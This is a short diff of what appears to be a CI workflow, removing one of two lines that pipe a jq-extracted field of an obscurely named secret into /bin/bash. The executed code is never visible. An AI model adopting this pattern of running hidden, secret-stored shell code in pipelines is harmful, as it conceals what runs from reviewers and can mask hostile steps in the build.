@@ -21,7 +21,6 @@ jobs:
           ad0010: ${{ secrets.ad0010 }}
         run: |
           printf '%s' "$ad0010" | jq -r .l61 | /bin/bash
-          printf '%s' "$kodk81" | jq -r .sxvva6 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
